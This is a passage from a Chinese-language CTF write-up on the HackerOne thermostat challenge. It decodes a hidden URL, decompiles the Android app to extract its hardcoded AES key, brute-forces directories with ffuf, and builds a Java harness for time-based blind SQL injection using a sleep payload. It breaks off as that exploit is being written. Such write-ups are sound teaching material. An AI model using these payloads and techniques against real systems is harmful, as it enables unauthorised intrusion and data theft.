### 总结：
有关挑战的简要概述，您可以查看以下图像：  
下面我将详细介绍我为解决CTF而采取的每一步，以及在某些情况下导致我走向死胡同的所有错误假设。
### Twitter
CTF从这条tweet开始：  
这些二进制是什么？  
我的第一个想法是尝试解码图像上的二进制。我还注意到在'_'字符后，二进制数字与前面的相同，即：
    01111010 01101100 01101001 01100010 00101011 01111000 10011100 01001011 11001010 00101100 11010001 01001011 11001001 11010111 11001111 00110000 00101100 11001001 01001000 00101101 11001010 00000101 00000000 00100101 11010010 00000101 00101001
所以，让我们看看这是否会转换成任何ascii码或可读的内容（python3的环境）
    >>> bin_array_image = ['0b01111010', '0b01101100', '0b01101001', '0b01100010', '0b00101011', '0b01111000', '0b10011100', '0b01001011', '0b11001010', '0b00101100', '0b11010001', '0b01001011', '0b11001001', '0b11010111', '0b11001111', '0b00110000', '0b00101100', '0b11001001', '0b01001000', '0b00101101', '0b11001010', '0b00000101', '0b00000000', '0b00100101', '0b11010010', '0b00000101', '0b00101001']
    >>> s = ''.join(chr(int(x,2)) for x in bin_array_image)
    >>> print(s)
    zlib+xKÊ,ÑKÉ×Ï0,ÉH-Ê %Ò)
很好，前五个字符是：zlib +。所以，也许我们应该使用zlib来解压缩剩余的字节。
    >>> import zlib
    >>> byte_string = bytes([int(x,2) for x in bin_array_image][5:])
    >>> print(zlib.decompress(byte_string))
    b'bit.do/h1therm'
好。现在我们有一个重定向到Google云端硬盘中的APK文件的网址。我们下载吧。
### APK
作为我的第一步，我使用[JADX](https://github.com/skylot/jadx "JADX")反编译应用程序并开始检查代码：  
阅读AndroidManifest.xml我可以找到两个activity类：`com.hackerone.thermostat.LoginActivity`和`com.hackerone.thermostat.ThermostatActivity`
### LoginActivity.class
LoginActivity的核心功能是对用户进行身份验证：
    private void attemptLogin() throws Exception {
        ...
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("username", username);
        jSONObject.put("password", password);
        jSONObject.put("cmd", "getTemp");
        Volley.newRequestQueue(this).add(new PayloadRequest(jSONObject, new Listener() {
            public void onResponse(String str) {
                if (str == null) {
                    LoginActivity.this.loginSuccess();
                    return;
                }
                LoginActivity.this.showProgress(false);
                LoginActivity.this.mPasswordView.setError(str);
                LoginActivity.this.mPasswordView.requestFocus();
            }
        }));
在`attemptLogin`中，App构建了一个像这样的json对象：`{“username”：“”，“password”：“”，“cmd”：“getTemp”}`然后实例化一个PayloadRequest对象，该对象将被添加到一个Volley
Queue中去处理。那么让我们看看这个类做了什么。
### PayloadRequest.class
    public class PayloadRequest extends Request {
         public PayloadRequest(JSONObject jSONObject, final Listener listener) throws Exception {
            super(1, "http://35.243.186.41/", new ErrorListener() {
                public void onErrorResponse(VolleyError volleyError) {
                    listener.onResponse("Connection failed");
                }
            });
            this.mListener = listener;
            this.mParams.put("d", buildPayload(jSONObject));
        }
从这里我们可以注意到一个URL
`http://35.243.186.41/`，它可能被用作后端服务器。此外，还有一个名为buildPayload的方法，它将作为d参数的值。
    private String buildPayload(JSONObject jSONObject) throws Exception {
            SecretKeySpec secretKeySpec = new SecretKeySpec(new byte[]{(byte) 56, (byte) 79, (byte) 46, (byte) 106, (byte) 26, (byte) 5, (byte) -27, (byte) 34, (byte) 59, Byte.MIN_VALUE, (byte) -23, (byte) 96, (byte) -96, (byte) -90, (byte) 80, (byte) 116}, "AES");
            byte[] bArr = new byte[16];
            new SecureRandom().nextBytes(bArr);
            IvParameterSpec ivParameterSpec = new IvParameterSpec(bArr);
            Cipher instance = Cipher.getInstance("AES/CBC/PKCS5Padding");
            instance.init(1, secretKeySpec, ivParameterSpec);
            byte[] doFinal = instance.doFinal(jSONObject.toString().getBytes());
            byte[] bArr2 = new byte[(doFinal.length + 16)];
            System.arraycopy(bArr, 0, bArr2, 0, 16);
            System.arraycopy(doFinal, 0, bArr2, 16, doFinal.length);
            return Base64.encodeToString(bArr2, 0);
        }
buildPayload方法在CBC模式下使用对称密钥算法[4]（AES），它使用相同的加密密钥来加密明文和解密密文。而且，secretKeySpec是密钥，PKCS＃5是填充方法。因此，我们的json总是被加密发送到后端服务器。此外，还有一种处理响应的方法，称为parseNetworkResponse，它使用相同的算法和密钥。
### ThermostatActivity.class
另一个ActivityClass是`ThermostatActivity`，它两次调用`setTargetTemperature`并更新`thermostatModel`属性。同样使用`LoginActivity`中相同的json对象发送`getTemp`命令，但正如您所看到的，对结果没有做任何事情`（String
str）`
    private void setDefaults(final ThermostatModel thermostatModel) throws Exception {
            thermostatModel.setTargetTemperature(Integer.valueOf(77));
            thermostatModel.setCurrentTemperature(Integer.valueOf(76));
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("username", LoginActivity.username);
            jSONObject.put("password", LoginActivity.password);
            jSONObject.put("cmd", "getTemp");
            volleyQueue.add(new PayloadRequest(jSONObject, new Listener() {
                public void onResponse(String str) {
                    thermostatModel.setTargetTemperature(Integer.valueOf(70));
                    thermostatModel.setCurrentTemperature(Integer.valueOf(73));
                }
            }));
        }
### com.hackerone.thermostat.Model.ThermostatModel
分析其他类，我们找到一个带有`setTargetTemperatute`方法的`ThermostatModel`，它给我们另一个命令：`setTemp`。这个新命令的有趣之处在于现在我们有了一个新的json属性`temp`，它是`setTemp`的参数。
    public void setTargetTemperature(Integer num) {
            this.targetTemperature.setValue(num);
            try {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put("username", LoginActivity.username);
                jSONObject.put("password", LoginActivity.password);
                jSONObject.put("cmd", "setTemp");
                jSONObject.put("temp", num);
                ThermostatActivity.volleyQueue.add(new PayloadRequest(jSONObject, new Listener() {
                    public void onResponse(String str) {
                    }
                }));
            } catch (Exception unused) {
            }
            updateCooling();
        }
### Dir Brute
为什么不这样做？我们有一个运行Web服务器的IP，所以让我们看一下今天是否是我们的幸运日，并获得一些唾手可得的结果，找出一个隐藏的端点。使用[FFUF](https://github.com/ffuf/ffuf
"FFUF") ：
    ./ffuf -u http://35.243.186.41/FUZZ -w wordlists/SecLists/Discovery/Web-Content/big.txt
    ./ffuf -u http://35.243.186.41/FUZZ -w wordlists/SecLists/Discovery/Web-Content/raft-large-directories-lowercase.txt
没那么容易......
### Creating a Java Application
在初始侦察之后，是时候尝试与后端服务器交互的一些攻击了。为此，我刚刚使用App中的相同源代码创建了一个java应用程序，并进行了少量更改。
    public static String sendCommand(String username, String password, String cmd) throws Exception {
            return PayloadRequest.sendCommand(username, password, cmd, null);
        }
        public static String sendCommand(String username, String password, String cmd, String tmp) throws Exception {   
            JSONObject jSONObject = new JSONObject();
                jSONObject.put("username", username);
                jSONObject.put("password", password);
                jSONObject.put("cmd", cmd);
                if( tmp != null) {
                jSONObject.put("temp", tmp);
                }
                return send(jSONObject);
        }
        public static String send(Object jSONObject) throws Exception {
            String payload = PayloadRequest.buildPayload(jSONObject);
                URL url = new URL("http://35.243.186.41");
                HttpURLConnection con = (HttpURLConnection) url.openConnection();
                con.setRequestMethod("POST");
                Map parameters = new HashMap<>();
                parameters.put("d", payload);
                ...
                return PayloadRequest.parseNetworkResponse(content.toString());
        }
所以我们现在可以使用上面的`sendCommand`方法向后端发送命令。我在这里的第一个猜测是尝试一些SQL注入。但是我们有一些限制，因为服务器只返回“无效的用户名或密码”或“Unknown”。第一条消息出现在没有错误但是用户名和密码不匹配的情况，第二条消息出现在某些东西出错的时候。因为这些限制，我们可以尝试2中方法：基于时间的盲注或者基于错误的盲注。让我们用最简单的payload来尝试基于时间的盲注：
    System.out.println(PayloadRequest.sendCommand("'||sleep(10)#", "", ""));
    // After 10 seconds ...
    // {"success": false, "error": "Invalid username or password"}
### Time Based SQL Injection
什么？我们找到漏洞了吗？上面的payload经过10秒钟才获得响应！这绝对是我的幸运日......我现在能做什么？也许是启动[SQLMap](http://sqlmap.org/
"SQLMap")？不，不！这不够31337（不够专业）！让我们用Java创建自己的SQL盲注exp！首先，我们需要比较两个字符，并根据响应时间确定一个布尔值：True或False。我们可以实现如下：
    public static boolean blindBoolean(String payload) throws Exception {
            long startTime = System.nanoTime();
        PayloadRequest.sendCommand(payload, "", "");
        long endTime = System.nanoTime();
        long timeElapsed = endTime - startTime;     
        return (timeElapsed / 1000000) > PayloadRequest.TIME_TO_WAIT * 1000;    
        }